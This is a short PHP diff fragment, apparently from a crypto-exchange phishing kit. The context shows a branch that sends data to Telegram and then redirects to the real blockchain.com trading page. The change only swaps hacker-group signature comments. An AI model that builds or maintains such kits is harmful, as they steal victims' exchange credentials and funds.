@@ -28,9 +28,9 @@ if ($sendToTelegram) {
   header('Location: https://exchange.blockchain.com/trade');
 }
 
-// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
-// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
-// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
-// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
+// @MRs_SORRY / @HACK_LIVE_ORIGINAL / 2022
+// @MRs_SORRY / @HACK_LIVE_ORIGINAL / 2022
+// @MRs_SORRY / @HACK_LIVE_ORIGINAL / 2022
+// @MRs_SORRY / @HACK_LIVE_ORIGINAL / 2022
 
 ?>
